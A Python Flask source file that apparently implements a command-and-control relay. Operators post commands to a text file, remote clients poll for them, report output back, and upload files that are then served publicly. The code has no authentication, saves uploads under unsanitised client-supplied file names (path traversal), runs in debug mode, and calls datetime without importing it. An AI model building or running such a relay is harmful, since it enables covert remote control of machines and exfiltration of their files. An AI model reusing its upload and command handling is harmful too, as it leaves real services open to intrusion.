from flask import Flask, request, jsonify, render_template, send_from_directory
import os

app = Flask(__name__)

# Configuration for uploads
UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# Create or overwrite Command.txt and Result.txt files
with open('Command.txt', 'w') as command_file:
    command_file.write('')
with open('Result.txt', 'w') as result_file:
    result_file.write('')

def log_activity(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open('activity_log.txt', 'a') as log_file:
        log_file.write(f"{timestamp} - {message}\n")

@app.route('/', methods=['GET'])
def index():
    files = os.listdir(app.config['UPLOAD_FOLDER'])
    return render_template('index.html', files=files)

@app.route('/command', methods=['GET', 'POST'])
def handle_command():
    if request.method == 'GET':
        try:
            with open('Command.txt', 'r') as file:
                command = file.read().strip()
            return jsonify({'command': command}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    elif request.method == 'POST':
        data = request.get_json()
        command = data['command']
        
        try:
            with open('Command.txt', 'a+') as file:
                file.write(command + '\n')
            return jsonify({'message': f'Command "{command}" sent successfully.'}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500

@app.route('/result', methods=['GET', 'POST'])
def handle_result():
    if request.method == 'GET':
        try:
            if not os.path.exists('Result.txt'):
                return jsonify({'result': ''}), 200
            with open('Result.txt', 'r') as file:
                result = file.read()
            return jsonify({'result': result}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    elif request.method == 'POST':
        data = request.get_json()
        result = data['result']
        try:
            with open('Result.txt', 'w') as file:
                file.write(result + '\n')
            return jsonify({'message': f'Result updated successfully.'}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500

@app.route('/upload', methods=['POST'])
def file_upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    if file:
        filename = file.filename
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        return jsonify({'message': f'File {filename} uploaded successfully.'}), 200

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

if __name__ == '__main__':
    app.run(debug=True)
